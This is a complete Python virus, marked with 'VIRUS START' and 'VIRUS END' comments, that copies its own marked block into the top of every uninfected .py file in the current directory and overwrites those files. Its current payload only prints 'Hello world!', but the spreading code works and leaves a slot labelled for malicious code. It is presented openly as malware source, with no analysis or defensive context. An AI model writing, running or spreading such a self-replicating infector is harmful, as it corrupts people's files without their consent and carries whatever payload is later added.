### VIRUS START ###
import sys
import glob

code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

in_virus = False
for line in lines:
    if line == '### VIRUS START ###\n':
        in_virus = True
    if in_virus:
        code.append(line)
    if line == '### VIRUS END ###\n':
        break

python_files = glob.glob('*.py')

for script in python_files:
    with open(script, 'r') as f:
        file_code = f.readlines()

    infected = False
    for line in file_code:
        if line == '### VIRUS START ###\n':
            infected = True
            break

    if not infected:
        full_code = []
        full_code.extend(code)
        full_code.extend('\n')
        full_code.extend(file_code)

        with open(script, 'w') as f:
            f.writelines(full_code)

# malicious code
print("Hello world!")

### VIRUS END ###